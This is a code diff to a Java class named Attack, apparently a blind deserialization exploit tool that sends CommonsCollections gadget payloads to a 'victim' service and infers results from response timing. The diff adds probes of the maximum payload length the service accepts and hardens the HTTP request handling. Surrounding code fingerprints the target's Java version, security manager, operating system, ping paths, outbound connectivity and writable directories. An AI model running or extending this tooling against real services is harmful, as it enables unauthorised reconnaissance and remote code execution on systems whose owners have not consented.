@@ -45,9 +45,28 @@ public class Attack {
         log("Sleep Commons05 worked: %s", sleep05Worked);
         final boolean sleep06Worked = applyPayloadOnVictim(sleepJson, true, 6, null);
         log("Sleep Commons06 worked: %s", sleep06Worked);
+        log(" ");
 
         // CommonsCollections 2,3,4 are using template with Code construction javassist.
         // This module is not implemented yet.
+
+        // Test maximum length of the payload accepted by the service
+        final boolean len1k = applyPayloadOnVictim(
+                merge(AttackTools.payloadCmd("lengthTest", 1024), sleepJson));
+        log("Length limit 1k passed: %s", len1k);
+        final boolean len4k = applyPayloadOnVictim(
+                merge(AttackTools.payloadCmd("lengthTest", 4096), sleepJson));
+        log("Length limit 4k passed: %s", len4k);
+        final boolean len16k = applyPayloadOnVictim(
+                merge(AttackTools.payloadCmd("lengthTest", 16384), sleepJson));
+        log("Length limit 16k passed: %s", len16k);
+        final boolean len256k = applyPayloadOnVictim(
+                merge(AttackTools.payloadCmd("lengthTest", 262144), sleepJson));
+        log("Length limit 256k passed: %s", len256k);
+        final boolean len1M = applyPayloadOnVictim(
+                merge(AttackTools.payloadCmd("lengthTest", 1048576), sleepJson));
+        log("Length limit 1M passed: %s", len1M);
+        log(" ");
 
         // Java version counter, all java versions, to be sure
         for(int i = 4; i <= 8; i++){
@@ -55,12 +74,14 @@ public class Attack {
             final boolean javaBool = applyPayloadOnVictim(Arrays.asList(javaJson, sleepJson));
             log("Java %d version: %s", i, javaBool);
         }
+        log(" ");
 
         // Security manager in place?
         final boolean secMgrWasNull = applyPayloadOnVictim(AttackTools.sleepOnPredicate(
                 merge(AttackTools.payloadCmd("secMgr"), AttackTools.payloadCmd("pnull", null))
         ));
         log("Security manager == null? %s", secMgrWasNull);
+        log(" ");
 
         // OS detection
         JSONObject osNameProp = AttackTools.payloadCmd("property", "os.name");
@@ -83,6 +104,7 @@ public class Attack {
         log("OS: nux: %s", isNux);
         log("OS: sun: %s", isSun);
         log("OS: bsd: %s", isBsd);
+        log(" ");
 
         // Ping path
         final boolean isPing01 = applyPayloadOnVictim(AttackTools.sleepOnPredicate(
@@ -102,6 +124,7 @@ public class Attack {
         log("OS: /usr/bin/ping %s", isPing03);
         log("OS: /usr/sbin/ping %s", isPing04);
         log("OS: /usr/local/bin/ping %s", isPing05);
+        log(" ");
 
         // Can connect?
         JSONObject connJson = AttackTools.payloadCmd("secConnect");
@@ -129,6 +152,7 @@ public class Attack {
         final boolean writeVarTmp = applyPayloadOnVictim(AttackTools.sleepOnPredicate(
                 AttackTools.payloadCmd("fileCanWrite", "/var/tmp")));
         log("Can write to /var/tmp : %s", writeVarTmp);
+        log(" ");
 
         //Operating system name
         dumpProperty("os.name");
@@ -390,17 +414,22 @@ public class Attack {
 
         // Execute the payload, measure the time spent in the call for
         // the blind decision.
+        final RunResult rRes = new RunResult();
         final long timeStart = System.currentTimeMillis();
-        final String result = AttackUtils.httpGet(url);
-        final long elapsed = System.currentTimeMillis() - timeStart;
+        String result = null;
+
+        try {
+            result = AttackUtils.httpGet(url);
+        } catch(Exception e){
+            log("Exception in get Req");
+        }
 
         // Build the result.
-        final RunResult rRes = new RunResult();
-        rRes.elapsedMilli = elapsed;
+        rRes.elapsedMilli = System.currentTimeMillis() - timeStart;
         rRes.result = result;
 
         // Adapt to your application if the result was OK.
-        rRes.resultOk = result.contains("success");
+        rRes.resultOk = result != null && result.contains("success");
         return rRes;
     }
 
